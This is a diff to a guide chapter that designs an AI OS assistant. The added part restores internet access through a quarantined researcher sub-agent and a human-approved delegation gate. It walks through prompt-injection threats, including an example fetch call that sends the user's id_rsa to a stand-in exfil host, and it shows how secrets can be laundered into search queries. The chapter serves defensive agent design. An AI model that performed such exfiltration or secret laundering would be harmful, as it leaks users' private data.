@@ -1,4 +1,4 @@
-# Chapter 7 — The OS assistant: your machine, no network
+# Chapter 7 — The OS assistant: your machine
 
 This is the first *complete, fully-implemented* assistant in the
 guide — and the gentlest possible introduction to the densest part
@@ -34,6 +34,16 @@ sharper edges (bubblewrap's overlays, the git-config hardening, the
 project-root containment algorithm) wait for chapter 8, where a
 developer audience needs them. Reading order isn't dependency order:
 the relatable agent comes first, then we peel back a layer.
+
+The chapter runs in two parts. **Part 1** builds the agent as described
+above — full disk, network severed. **Part 2** does the harder thing:
+it puts the network *back*, carefully, without handing the trifecta its
+third leg — and it's where [chapter 2](02-subagents.md)'s sub-agents
+earn their keep for privacy, not just parallelism.
+
+---
+
+## Part 1 — Your machine, no network
 
 ## Prerequisites
 
@@ -343,25 +353,188 @@ and `/impl` flips it back. It gates only the *writing* file tools,
 never `bash`'s read-only commands, and the toggle is host-side: it's
 never sent to the model.
 
-## The third leg, deferred
+---
 
-The obvious next wish is "give it the internet." We don't — yet — and
-the reason is the whole point of this chapter. Egress is the leg we
-removed to make reading your dirty disk safe. Adding it back reassembles
-the full trifecta: private data (your disk) + untrusted content (logs,
-downloads) + a way out. The clean answer is a privilege-separated
-investigator sub-agent that can search the web but is structurally
-barred from the private filesystem context — which depends on taint
-machinery that isn't built. So the internet OS assistant is a future
-chapter, not a flag; until then, the severed network is what keeps this
-design simple and safe.
+## Part 2 — The third leg returns
+
+The obvious next wish is "give it the internet." Part 1 cut egress to
+make reading your dirty disk safe; the whole difficulty of Part 2 is that
+a way out reassembles the full trifecta — private data (your disk),
+untrusted content (logs, downloads), and now somewhere to send it. This
+part restores the network *without* handing that third leg back. It's
+opt-in and off by default: the agent stays exactly the Part 1 agent until
+you pass `--with-internet`.
+
+You might expect this to need elaborate taint-tracking — marking the
+context "private" the moment it reads a file and severing egress from
+then on. It doesn't: privilege separation plus a confirmed task turns
+out to be enough, and that simpler shape is the story below.
+
+## web_search vs fetch — who picks the destination
+
+The two ways to reach the web are not equally dangerous, and the whole
+design turns on the difference: **who chooses the destination host.**
+
+- **`web_search`** — the model writes the *query*; **pikuri** picks the
+  *destination* (one of a few baked-in engines: DuckDuckGo, Brave, Exa).
+  An injection can smuggle a secret *into* the query string, but it can't
+  point the request at its own server. Worst case, a search engine learns
+  a laundered query — bad, but *bounded* and *attacker-blind*: a
+  write-only dead-drop the adversary can't read back.
+- **`web_scrape` / `fetch`** — the model supplies the *entire URL, host
+  included*. `fetch("https://exfil.example/?d=<contents of id_rsa>")` is
+  a one-call exfiltration; the recipient *is* the attack. Unbounded and
+  attacker-controlled.
+
+So egress isn't a single leg you either have or don't — it's a spectrum
+from "bounded write-only" to "arbitrary exfil," set by who controls the
+recipient. That distinction is the lever the rest of Part 2 pulls.
+
+## Quarantine, don't grant
+
+Given that, the design choice isn't *which* web tools the OS agent gets —
+it's that the OS agent gets **none** of them. All three live one level
+down, on a privilege-separated research sub-agent — the bundled
+`RESEARCHER` persona from [chapter 2](02-subagents.md) — reached through
+the `agent` tool:
+
+```ruby
+c.add_sub_agent_tool Pikuri::Tool::WebSearch.build(brave_key:, exa_key:)
+c.add_sub_agent_tool Pikuri::Tool::WEB_SCRAPE
+c.add_sub_agent_tool Pikuri::Tool::FETCH
+c.add_extension Pikuri::SubAgent::Extension.new(
+  personas: [Pikuri::SubAgent::RESEARCHER],
+  confirmer: confirmer
+)
+```
+
+`add_sub_agent_tool` (not `add_tool`) is the load-bearing choice: those
+tools are registered so *only a sub-agent* may see them — the parent LLM
+never holds `fetch`, and so has **no direct egress at all**. And
+`RESEARCHER` has the web tools but **no filesystem** — it can't read your
+disk. Line the legs up against [chapter 6](06-security.md)'s trifecta:
+
+- **The researcher** holds untrusted content + egress, but *not* private
+  data — two legs, not three. Its `fetch` is unbounded, yes, but it has
+  nothing private to send: the most it can leak is the task you handed it
+  plus the public pages it fetched.
+- **The parent** holds your disk (private) and reads untrusted files, but
+  its only route out is *delegating* to the researcher. It never touches
+  the web itself.
+
+No single context holds all three legs. That's the structural break — the
+same "remove a leg" move as Part 1, but made *per-agent* instead of
+*per-machine*.
+
+## The gate — you author what leaves the machine
+
+Privilege separation alone raises the bar without quite breaking the
+trifecta: the parent can still *ask* the researcher to look up "the drug
+named `<secret>`," laundering a secret into the task string it writes. A
+general researcher faithfully searches whatever subject it's handed — it
+judges *how* to research a subject, never *whether* the subject is
+legitimate.
+
+So the task prompt — the one thing that crosses from the private side to
+the networked side — stops for you:
+
+```
+Delegate this task to the 'researcher' sub-agent? It reaches the
+network — you approve what leaves this machine.
+  the current stable kernel version for Ubuntu 26.04
+(y/n)?
+```
+
+This is the same `Confirmer` from Part 1, reused unchanged. The point is
+subtle, and it's the lesson from `MACHINE.md`'s confirmed writes again:
+you are **not** being asked to approve the agent's *judgement* — you
+can't reliably spot a secret laundered into a plausible query (chapter
+6's "no NX flag for content"). You are being asked to **author the
+egress** — to read what's about to leave, and let it go. A human
+approving the outbound payload is clean by construction in a way an
+injection-driven LLM composing it is not.
+
+The reply comes back *without* a second confirmation, and that asymmetry
+is deliberate. The untrusted-content leg was already accepted in Part 1
+(the agent reads hostile logs off your disk all day), and the
+researcher's answer arrives *summarised* — an injection buried in a
+fetched page reaches the parent as a reported fact ("the page also said
+to…"), not a live instruction. Confirm what goes *out*; let what comes
+*in* be data, as it always was.
+
+(The gate today is a plain yes/no on the shown task. Two sharper shapes —
+letting you *edit* the task in place before it goes, and typing a reason
+on a rejection to steer the agent — are sketched in
+[`ideas/more-confirmers.md`](../../ideas/more-confirmers.md) and deferred
+to their own pass.)
+
+## Two network boundaries, not one
+
+It's worth being exact about what `--with-internet` opens, because it is
+*not* the boundary Part 1 built. There are two independent cuts:
+
+1. **The bash sandbox** (`FullFsNoNet`) governs what the *shell
+   subprocess* can reach. `--with-internet` does **not** touch it — bash
+   stays kernel-severed whether or not the researcher is wired.
+2. **Process-level HTTP** — the web tools make their requests from the
+   pikuri process itself (over Faraday), entirely outside the shell
+   sandbox.
+
+You can watch both hold at once: with `--with-internet` on, ask the agent
+to run `bash: curl https://example.com` and it still fails — no route,
+the network namespace is unshared — while a research delegation succeeds.
+Two boundaries, set independently; the flag moves only the second.
+
+## Reading PDFs
+
+A researcher that can't read the PDF it just found is half-blind, so
+`pikuri-os` registers a PDF text extractor into the extraction registry
+([chapter 3](03-vectordb.md) met that registry):
+
+```ruby
+require 'pikuri-pdf'
+Pikuri::Extractors::PDF.register
+```
+
+It's `pikuri-pdf`'s pure-Ruby reader — no subprocess, no docker, no
+network, and it neither executes embedded JavaScript nor fetches remote
+resources, so a hostile PDF can't turn *parsing* into egress and it stays
+off the sandbox seam. That fit with the offline, audit-first posture is
+why it wins here over the heavier sandboxed extractor (which would drag in
+docker). It's registered **unconditionally**, not gated on
+`--with-internet`: reading a local `~/Documents/*.pdf` is core
+OS-assistant work too, and the extractor is inert until a PDF actually
+shows up.
+
+## The residual, honestly
+
+Part 2 *weakens* the third leg; it does not delete it. What remains:
+
+- **A bounded query leak.** The researcher can still be steered to put
+  sensitive words into a search — to an engine that can't be read back by
+  the attacker, but that does learn the query. This is the accepted floor
+  of "usable web access at all," and it's the same leak your everyday
+  browser already makes.
+- **DoS, not RCE.** A crafted PDF could burn CPU/memory in the pure-Ruby
+  parser; it can't execute code or phone home, and the run is interactive
+  — Ctrl+C ends it.
+- **Your attention on the gate.** The whole break rests on you *reading*
+  the task you approve. A rubber-stamped delegation is the same failure as
+  a rubber-stamped `MACHINE.md` edit — which is why the prompt shows you
+  the exact task, and why Part 1's fewer-but-meaningful-prompts argument
+  matters here too.
+
+Everything sharper — the editable-task author seat, richer confirmers, an
+ingest-side gate on what the researcher returns — is future work in
+[`ideas/more-confirmers.md`](../../ideas/more-confirmers.md).
 
 ## What's next
 
 [Chapter 8 — the in-repo coding agent](08-code.md) takes the four
-seams you just met and makes the opposite cut. Where this agent
-severed the network and kept the whole disk, the coding agent keeps
-the network — a build needs it — and confines the disk instead:
+seams you just met and makes the opposite cut. Where this agent severed
+the network and kept the whole disk — restoring egress only inside a
+quarantined researcher — the coding agent keeps the network in the
+parent's own hands (a build needs it) and confines the disk instead:
 `Bubblewrap` in place of `FullFsNoNet`, a project-rooted `Workspace`
 in place of `AllowAll`. Same `Confirmer`, same `bash`, same
 read-only auto-confirmer (now with the git hardening unpacked). Same
